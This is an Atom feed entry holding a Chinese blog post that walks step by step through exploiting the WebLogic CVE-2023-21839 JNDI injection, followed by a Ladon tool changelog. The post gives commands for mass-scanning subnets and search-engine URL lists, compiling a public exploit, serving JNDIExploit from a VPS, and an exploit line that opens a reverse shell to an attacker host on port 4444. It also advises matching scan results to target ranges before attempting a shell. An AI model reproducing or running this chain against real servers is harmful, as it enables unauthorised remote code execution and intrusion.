+    <content type="html"><![CDATA[<h3 id="0x00-实验环境">0x00 实验环境</h3><p>攻击机：Windows</p><p>靶场：vulhub 12.2.1.3环境</p><h3 id="0x01-影响版本">0x01 影响版本</h3><p>允许远程用户在未经授权的情况下通过 IIOP/T3 进行 JNDI lookup 操作，当 JDK 版本过低或本地存在小工具（javaSerializedData）时，这可能会导致 RCE 漏洞</p><p>WebLogic_Server = 12.2.1.3.0<br>WebLogic_Server = 12.2.1.4.0<br>WebLogic_Server = 14.1.1.0.0</p><h3 id="0x02-漏洞复现">0x02 漏洞复现</h3><p>####（1）Ladon T3info模块探测 weblogic版本</p><p>探测到版本代表开启T3协议 版本符合可尝试是否存在漏洞</p><p>Ladon noping 192.168.188.2/24 T3info<br>Ladon 192.168.188.2:7001 T3info<br>Ladon <a href="http://192.168.188.2:7001">http://192.168.188.2:7001</a>  T3info<br>Ladon url.txt T3info<br>Ladon noping ip.txt T3info<br>LadonGo对应模块为T3scan</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/ESAML7BuCW6NOBN94RVlzvibkBgt3opm1hEeO8nGRxSNhLAibtnNajiaL4GiasFlEZnlSpI870ZI3jzackRic6gss1Q/640?wx_fmt=png&amp;wxfrom=5&amp;wx_lazy=1&amp;wx_co=1" alt="使用http访问查看图片"></p><p>相关搜索引擎导出url,然后批量检测T3协议</p><p>Ladon url.txt T3info &gt; T3ver.txt</p><p>当然也可以直接检测目标C段是否存在weblogic</p><p>Ladon noping ip24.txt T3info &gt; T3ver.txt<br>Ladon noping 192.168.1.8/24 T3info &gt; T3ver.txt</p><p>####（2）FindIP模块匹配目标</p><p>Key.txt存放LadonGUI处理的目标C段，当然手动也可以，使用</p><p>Ladon FindIP key.txt T3ver.txt</p><p>匹配C段是否出现在结果中，出现则有可能与目标有关，可以尝试GetShell</p><p>图片</p><p>####（3）使用网上开源工具<a href="https://github.com/4ra1n/CVE-2023-21839">https://github.com/4ra1n/CVE-2023-21839</a></p><p>GO编译</p><p>go build -o CVE-2023-21839.exe</p><p>####（4）漏洞检测</p><p>通过Ladon监听，无需dnslog等，不会向第3方泄露授权检测站点漏洞信息，部署在目标内网也可解决目标内网不出网无法利用目标内网存在相关漏洞的问题。</p><h5 id="Ladon-监听命令：">Ladon 监听命令：</h5><p>Ladon web 800</p><p>使用20230228后版本，不然批量LDAP时可能会崩溃</p><h5 id="exp测试漏洞">exp测试漏洞</h5><p>exp.exe -ip 192.168.188.3 -port 7001 -ldap ldap://192.168.188.2:800</p><p>Ladon监听出现JNDI_LDAP字符串 代表存在JNDI注入漏洞</p><p>图片</p><p>####（4）反弹shell：</p><p>使用JNDI漏洞利用工具，在VPS开启服务，监听1389端口。</p><p>java -jar JNDIExploit-1.4-SNAPSHOT.jar -i 192.168.188.2 -l 1389 -p 9999</p><p>####（5）在VPS上使用Ladon监听端口：</p><p>Ladon NC监听 4444</p><p>####（6）在渗透机上执行以下命令</p><p>CVE-2023-21839 -ip 192.168.188.3 -port 7001 -ldap ldap://192.168.188.2:1389/Basic/ReverseShell/192.168.188.2/4444</p><p>图片</p><p>####（7）成功getshell</p><p>接下来就可以执行任意命令，linux也可以使用自带NC监听，对于windows可使用PowerLadon内存加载后渗透。</p><p>图片</p><p>Ladon 10.9 20230302<br>[u]LadonExp     编译EXE支持执行CMD  Payload变量$cmd$ 变量$b64cmd$<br>[u]web         CS版不含该模块  识别JAVA  JNDI_LDAP  JNDI_RMI请求<br>[u]WebLogicPoc    CVE-2020-14883高危漏洞检测可识别出Windows或Linux<br>[-]PortTran      CS版移除 端口转发工具<br>[u]Ladon911      本地测试用的全功能版(即保留旧漏洞和一些过时功能)<br>[-]Help        仅911版保留    功能很多 建议看Wiki或Ladon Study<br>[-]SMBGhost      仅CS和911版保留 Win10默认自动更新，实战遇到概率低<br>[-]vsFTPdPoc    仅CS和911版保留 2011漏洞过旧，实战遇到概率低<br>[-]CVE-2021-36934  仅CS和911版保留 Win10默认自动更新，实战可用概率低<br>[-]PhpStudyPoc    仅CS和911版保留<br><img src="/k8img/Ladon/exe/Ladn85Subdomain.PNG" alt="使用http访问查看图片"></p><p>如果已整理好URL，可使用WhatCMS快速识别</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ladon url.txt WhatCMS</span><br></pre></td></tr></table></figure><p><img src="/k8img/Ladon/cs/CS_WhatCMS.gif" alt="使用http访问查看图片"></p><h3 id="Ladon下载">Ladon下载</h3><p>PowerLadon: <a href="https://github.com/k8gege/PowerLadon">https://github.com/k8gege/PowerLadon</a><br>历史版本: <a href="http://github.com/k8gege/Ladon/releases">http://github.com/k8gege/Ladon/releases</a><br>911版本：<a href="http://k8gege.org/Download">http://k8gege.org/Download</a><br>10.10版本：K8小密圈</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h3 id=&quot;0x00-实验环境&quot;&gt;0x00 实验环境&lt;/h3&gt;
+&lt;p&gt;攻击机：Windows&lt;/p&gt;
+&lt;p&gt;靶场：vulhub 12.2.1.3环境&lt;/p&gt;
+&lt;h3 id=&quot;0x01-影响版本&quot;&gt;0x01 影响版本&lt;/h3&gt;
+&lt;p&gt;允许远程用户在未经授权的情况下通过 IIOP</summary>
+      
+    
+    
+    
+    <category term="Ladon" scheme="http://k8gege.org/categories/Ladon/"/>
+    
+    
+    <category term="CVE-2023-21839" scheme="http://k8gege.org/tags/CVE-2023-21839/"/>
+    
+    <category term="Weblogic" scheme="http://k8gege.org/tags/Weblogic/"/>
+    
+  </entry>
+  
+</feed>
